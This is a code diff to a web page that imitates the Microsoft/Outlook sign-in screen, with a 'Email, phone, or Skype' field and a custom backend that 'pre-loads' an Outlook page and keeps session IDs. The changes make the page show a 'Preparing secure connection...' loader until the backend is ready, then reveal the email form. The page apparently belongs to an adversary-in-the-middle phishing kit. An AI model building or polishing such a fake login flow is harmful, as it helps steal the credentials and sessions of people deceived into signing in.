@@ -511,8 +511,8 @@
                 <button type="button" class="cancel-btn" onclick="cancelLoading()">Cancel</button>
             </div>
 
-            <!-- Email form -->
-            <div id="emailForm">
+            <!-- Email form - Initially hidden until backend is ready -->
+            <div id="emailForm" style="display: none;">
                 <form onsubmit="startLogin(event)">
                     <div class="form-group">
                         <input type="email" id="email" class="microsoft-input" placeholder="Email, phone, or Skype" required>
@@ -569,6 +569,9 @@
 
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
+            // Start with loading dots - don't show email form until backend is ready
+            setLoading(true, 'Preparing secure connection...', false);
+            
             checkBackendHealth();
             checkSessionStatus();
             preloadOutlook();
@@ -776,7 +779,6 @@
 
             try {
                 document.getElementById('statusText').textContent = 'Pre-loading Outlook page...';
-                // Removed preload info message
 
                 const response = await fetch(`${API_BASE}/api/preload`, {
                     method: 'POST',
@@ -787,25 +789,38 @@
                 const data = await response.json();
 
                 if (response.ok) {
-                    if (data.status === 'preloaded') {
+                    if (data.status === 'preloaded' || data.status === 'already-loaded') {
                         document.getElementById('statusText').textContent = 'Outlook page ready - Enter email';
-                        // Removed success message notification
-                    } else if (data.status === 'already-loaded') {
-                        document.getElementById('statusText').textContent = 'Outlook page ready - Enter email';
-                        // Removed success message notification
-
-                        // If there's already a session, just store it without showing actions
+                        
+                        // Store session ID if provided
                         if (data.sessionId) {
                             currentSessionId = data.sessionId;
                         }
+                        
+                        // Backend is now ready to ask for email - show the email form
+                        setLoading(false);
+                        document.getElementById('emailForm').style.display = 'block';
+                        document.getElementById('headerTitle').textContent = 'Sign in';
+                        
+                        // Focus on email field
+                        setTimeout(() => {
+                            document.getElementById('email').focus();
+                        }, 100);
                     }
                 } else {
                     throw new Error(data.error || 'Failed to preload');
                 }
             } catch (error) {
-                document.getElementById('statusText').textContent = 'Backend online - Manual loading';
+                document.getElementById('statusText').textContent = 'Backend error - Manual loading available';
                 console.error('Preload failed:', error);
-                // Don't show error to user, just fallback to manual loading
+                
+                // Show error message and allow manual retry
+                setLoading(false);
+                showMessage('Unable to prepare login page. Please try refreshing the page.', 'error');
+                
+                // Show email form as fallback
+                document.getElementById('emailForm').style.display = 'block';
+                document.getElementById('headerTitle').textContent = 'Sign in';
             } finally {
                 preloadInProgress = false;
             }
